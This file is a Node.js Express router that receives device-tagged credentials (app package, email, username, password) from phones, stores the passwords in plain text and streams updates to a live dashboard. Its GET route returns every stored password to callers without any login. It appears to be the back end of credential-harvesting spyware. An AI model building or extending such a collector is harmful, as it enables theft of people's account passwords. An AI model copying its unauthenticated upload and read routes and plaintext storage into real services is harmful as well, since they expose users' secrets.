const express = require('express');
const router = express.Router();
const db = require('../database/init');
const crypto = require('crypto');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');

// POST /api/credentials - Upload single credential
router.post('/', (req, res) => {
    try {
        const { deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp } = req.body;
        
        if (!password) {
            return res.status(400).json({
                success: false,
                message: 'Password is required'
            });
        }
        
        // Save to database
        const credentialId = crypto.randomUUID();
        const stmt = db.prepare(`INSERT INTO credentials 
            (id, deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp, synced)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
        
        stmt.run(
            credentialId,
            deviceId || null,
            accountType || 'APP_PASSWORD',
            appPackage || null,
            appName || null,
            email || null,
            username || null,
            password, // Plain text password (not masked)
            domain || null,
            url || null,
            devicePassword ? 1 : 0,
            timestamp || Date.now(),
            1 // Mark as synced
        );
        stmt.finalize();
        
        // Broadcast WebSocket update (without password for security)
        if (deviceId) {
            const safeCredential = { ...req.body, password: '***' }; // Don't broadcast password
            websocketService.broadcastDataUpdate(deviceId, 'credential', safeCredential);
        }
        
        res.json({
            success: true,
            message: 'Credential saved successfully',
            id: credentialId
        });
    } catch (error) {
        console.error('Error saving credential:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving credential'
        });
    }
});

// POST /api/credentials/batch - Upload multiple credentials
router.post('/batch', (req, res) => {
    try {
        const credentials = req.body;
        
        if (!Array.isArray(credentials) || credentials.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Invalid credentials array'
            });
        }
        
        const stmt = db.prepare(`INSERT INTO credentials 
            (id, deviceId, accountType, appPackage, appName, email, username, password, domain, url, devicePassword, timestamp, synced)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
        
        const transaction = db.transaction((credentials) => {
            for (const cred of credentials) {
                const credentialId = crypto.randomUUID();
                stmt.run(
                    credentialId,
                    cred.deviceId || null,
                    cred.accountType || 'APP_PASSWORD',
                    cred.appPackage || null,
                    cred.appName || null,
                    cred.email || null,
                    cred.username || null,
                    cred.password, // Plain text password (not masked)
                    cred.domain || null,
                    cred.url || null,
                    cred.devicePassword ? 1 : 0,
                    cred.timestamp || Date.now(),
                    1 // Mark as synced
                );
                
                // Broadcast WebSocket update (without password for security)
                if (cred.deviceId) {
                    const safeCredential = { ...cred, password: '***' };
                    websocketService.broadcastDataUpdate(cred.deviceId, 'credential', safeCredential);
                }
            }
        });
        
        transaction(credentials);
        stmt.finalize();
        
        res.json({
            success: true,
            message: `Saved ${credentials.length} credentials successfully`,
            count: credentials.length
        });
    } catch (error) {
        console.error('Error saving credentials batch:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving credentials batch'
        });
    }
});

// GET /api/credentials - Get credentials (with optional filters and authorization)
router.get('/', optionalAuth, (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const { accountType, appPackage, email, deviceId, limit = 100 } = req.query;
        
        let query = 'SELECT * FROM credentials WHERE 1=1';
        const params = [];
        
        // Device owners can only see credentials from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            query += ' AND deviceId = ?';
            params.push(assignedDeviceId);
        } else if (deviceId) {
            // Admin can filter by deviceId
            query += ' AND deviceId = ?';
            params.push(deviceId);
        }
        
        if (accountType) {
            query += ' AND accountType = ?';
            params.push(accountType);
        }
        
        if (appPackage) {
            query += ' AND appPackage = ?';
            params.push(appPackage);
        }
        
        if (email) {
            query += ' AND email = ?';
            params.push(email);
        }
        
        query += ' ORDER BY timestamp DESC LIMIT ?';
        params.push(parseInt(limit));
        
        const stmt = db.prepare(query);
        const credentials = stmt.all(...params);
        stmt.finalize();
        
        res.json({
            success: true,
            credentials: credentials,
            count: credentials.length
        });
    } catch (error) {
        console.error('Error fetching credentials:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching credentials'
        });
    }
});

module.exports = router;
